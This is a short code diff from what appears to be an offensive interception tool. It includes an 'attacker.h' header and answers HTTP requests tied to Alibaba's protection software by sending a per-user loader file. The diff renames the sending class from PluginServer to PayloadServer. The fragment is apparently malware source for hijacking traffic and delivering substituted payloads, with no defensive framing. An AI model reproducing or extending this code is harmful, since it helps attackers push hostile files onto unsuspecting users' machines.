@@ -1,5 +1,5 @@
 #include "aliProtect.h"
-#include "PluginServer.h"
+#include "PayloadServer.h"
 #include "../attacker.h"
 #include "../HttpUtils.h"
 #include "../cipher/CryptoUtils.h"
@@ -262,7 +262,7 @@ int AlibabaProtect::replyAliProtect(char * dstbuf, int len, int dstbuflimit, LPH
 			"Content-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lphttp->username, ALIBABA_ALIAPPLOADER_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
 		return 0;
 	}else if (gAliProtectFlag == 5)
 	{
@@ -273,7 +273,7 @@ int AlibabaProtect::replyAliProtect(char * dstbuf, int len, int dstbuflimit, LPH
 			"Content-Length: %u\r\n\r\n";
 
 		string filename = Public::getUserUrl(lphttp->username, ALIBABA_ALIAPPLOADER_FILENAME);
-		int ret = PluginServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
+		int ret = PayloadServer::SendPluginFile(filename.c_str(), lphttp, szHttpHdrFormat, 1);
 		return 0;
 	}
 	return 0;
